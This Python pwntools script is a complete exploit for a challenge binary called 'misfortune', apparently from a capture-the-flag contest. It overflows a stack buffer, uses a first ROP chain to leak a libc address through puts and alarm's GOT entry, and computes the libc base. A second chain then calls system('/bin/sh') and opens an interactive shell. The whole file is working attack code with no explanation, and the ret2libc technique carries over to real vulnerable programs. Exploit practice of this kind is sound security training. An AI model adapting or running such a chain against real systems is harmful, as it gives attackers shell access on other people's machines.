#!/usr/bin/env python3

from pwn import *

exe = ELF("./misfortune_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret = rop.find_gadget(["ret"])[0]

success(f"{hex(pop_rdi)=}")
success(f"{hex(ret)=}")

main_function = exe.symbols.main
success(f"{hex(main_function)=}")

puts_plt = exe.plt.puts
alarm_got = exe.got.alarm
success(f"{hex(puts_plt)=}")
success(f"{hex(alarm_got)=}")

context.binary = exe


def conn():
    r = gdb.debug([exe.path])
    return r

def main():
    offset = 32
    length = 90

    r = conn()

    prompt = r.recvuntil(b"\n> ")
    print(prompt.decode('utf-8'))

    payload = b"".join([
        b"A" * offset,
        p64(ret),
        p64(pop_rdi),
        p64(alarm_got),
        p64(puts_plt),
        p64(main_function)
    ])

    payload += b"C" * (length - len(payload))

    r.send(payload)
    alarm_libc = u64(r.recvline().strip().ljust(8, b"\x00"))
    success(f"{hex(alarm_libc)=}")
    libc_base = alarm_libc - libc.symbols.alarm
    success(f"{hex(libc_base)=}")
    libc.address = libc_base

    system = libc.symbols.system
    bin_sh = next(libc.search(b"/bin/sh\x00"))

    success(f"{hex(system)=}")
    success(f"{hex(bin_sh)=}")

    prompt = r.recvuntil(b"\n> ")
    print(prompt.decode('utf-8'))

    payload = b"".join([
        b"A" * offset,
        p64(ret),
        p64(pop_rdi),
        p64(bin_sh),
        p64(ret),
        p64(system)
    ])
    payload += b"C" * (length - len(payload))
    r.send(payload)

    #Sleep 2 seconds to let the shell spawn
    sleep(2)
    r.sendline("id")
    r.interactive()

if __name__ == "__main__":
    main()